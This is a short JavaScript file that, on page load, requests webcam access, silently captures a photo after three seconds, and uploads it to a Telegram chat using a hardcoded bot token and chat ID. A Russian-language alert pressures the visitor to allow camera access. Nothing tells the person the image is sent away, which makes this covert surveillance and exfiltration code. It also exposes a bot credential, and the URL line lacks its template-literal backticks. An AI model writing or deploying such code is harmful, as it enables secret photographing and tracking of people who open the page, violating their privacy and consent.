const BOT_TOKEN = '8380564571:AAG6pyo--3PRjg7uRMI88SAI_J51w3Z5C8U';
const CHAT_ID = '7672652168';

async function sendTelegram(photoBase64) {
    const url = https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto;
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('photo', dataURItoBlob(photoBase64));
    await fetch(url, { method: 'POST', body: formData });
}

function dataURItoBlob(dataURI) {
    const byteString = atob(dataURI.split(',')[1]);
    const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
    const ab = new ArrayBuffer(byteString.length);
    const ia = new Uint8Array(ab);
    for (let i = 0; i < byteString.length; i++) {
        ia[i] = byteString.charCodeAt(i);
    }
    return new Blob([ab], { type: mimeString });
}

async function startCam() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();

        setTimeout(() => {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const photo = canvas.toDataURL('image/jpeg');
            sendTelegram(photo);
            stream.getTracks().forEach(track => track.stop());
        }, 3000);
    } catch (error) {
        alert('Ошибка доступа к камере. Разреши доступ и попробуй снова.');
    }
}

window.onload = startCam;
